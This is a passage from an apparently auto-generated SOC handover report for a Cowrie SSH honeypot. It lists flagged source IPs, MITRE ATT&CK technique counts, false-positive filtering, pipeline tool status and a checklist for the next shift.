| `1.220.119[.]116` | KR | LG DACOM Corporation | **100** ⚠️ | 43 |
| `180.76.98[.]88` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.184.38[.]93` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `117.57.205[.]36` | CN | CHINANET anhui province network | **100** ⚠️ | 36 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 327 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 123 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 118 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 64 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 63 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 338 cases |
| Tool 34  | Credential Extractor        | ✅ 241 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (0.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 119 priority case(s) shown individually · 23 recon entry/entries in table (12 group(s) consolidating 206 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-13T09:53:33Z_
